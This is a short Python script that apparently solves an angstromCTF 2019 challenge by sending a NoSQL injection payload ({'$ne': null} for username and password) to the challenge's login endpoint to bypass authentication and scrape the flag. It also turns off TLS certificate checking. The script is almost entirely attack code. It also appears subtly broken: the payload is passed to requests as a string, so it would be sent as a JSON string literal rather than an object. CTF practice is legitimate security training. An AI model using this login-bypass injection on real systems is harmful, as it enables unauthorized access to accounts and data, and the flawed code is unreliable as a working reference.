import requests
import re
URL = "https://nosequels.2019.chall.actf.co/login"
payload = '{"username": {"$ne": null}, "password": {"$ne": null}}'
cookies = {"token": "still_dont_know"} 
# we could have done it manually, and replaced the token with
# the token that your browser got for you

# init session
session = requests.Session()
# set re expression for token in headers
jwt_token_re = re.compile(r"token=(.*);")
# Getting the token for the first time

token_req = session.get(URL)
if token_req.status_code == 200:
    m = re.search(jwt_token_re, token_req.headers["Set-Cookie"])
    if m:
        # update token in cookies dict
        cookies["token"] = str(m.group(1))

    # Now let's send the json payload alongside the cookie we got above.
    # we will leave requests default behaviour to follow redirects which will redirect us to /site

flag_re = re.compile(r"actf{.*}")

# make request with mallicious payload

req = session.post(URL, json=payload, cookies=cookies, verify=False)
# verify=False is just for HTTPS connection

if req.status_code == 200:
    # FLAG match
    m = re.search(flag_re, req.text)
    if m:
        print("1st FLAG: ", m.group(0)) 


